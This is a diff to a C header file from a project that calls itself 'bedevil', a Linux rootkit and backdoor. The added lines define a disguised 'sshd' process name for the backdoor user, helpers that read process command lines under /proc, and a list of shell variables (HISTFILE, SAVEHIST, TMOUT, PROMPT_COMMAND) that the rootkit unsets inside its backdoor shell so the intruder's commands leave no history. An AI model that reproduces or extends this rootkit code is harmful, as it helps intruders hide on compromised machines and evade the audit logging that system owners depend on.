@@ -1,10 +1,15 @@
 #ifndef UTIL_H
 #define UTIL_H
 
-#define NAME_MAXLEN     128     /* max lengths for storing process name */
-#define CMDLINE_MAXLEN  512     /* & cmdline string. */
+#define HOME_VAR "HOME="INSTALL_DIR
+#define BD_SSHPROCNAME "sshd: "BD_UNAME
 
-#define PID_MAXLEN      10      /* +10 for those longer pids */
+#define CMDLINE_PATH      "/proc/%d/cmdline"
+#define FALLBACK_PROCNAME "YuuUUU"
+#define NAME_MAXLEN       128     /* max lengths for storing process name */
+#define CMDLINE_MAXLEN    512     /* & cmdline string. */
+
+#define PID_MAXLEN      16      /* maximum length a pid can be */
 #define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN
 
 #define MODE_NAME     0x01   /* defined modes for determining whether */
@@ -13,11 +18,11 @@
 
 void fallbackme(char **dest);
 char *get_cmdline(pid_t pid);
-int open_cmdline(pid_t pid);
+int  open_cmdline(pid_t pid);
 
 char *process_info(pid_t pid, int mode);
 /* macros for the use of process_info() for calling processes. */
-#define process_name() process_info(getpid(), MODE_NAME)
+#define process_name()    process_info(getpid(), MODE_NAME)
 #define process_cmdline() process_info(getpid(), MODE_CMDLINE)
 
 int cmp_process(char *name);
@@ -69,6 +74,11 @@ int not_user(int id){
         return 1;
     return 0;
 }
+
+/* bedevil unsets the following environment variables when
+ * it detects somebody (you) is in a rootkit/backdoor shell. */
+static char *unset_variables[4] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND"};
+#define UNSET_VARIABLES_SIZE sizeofarray(unset_variables)
 
 void unset_bad_vars(void);
 int is_bdusr(void);
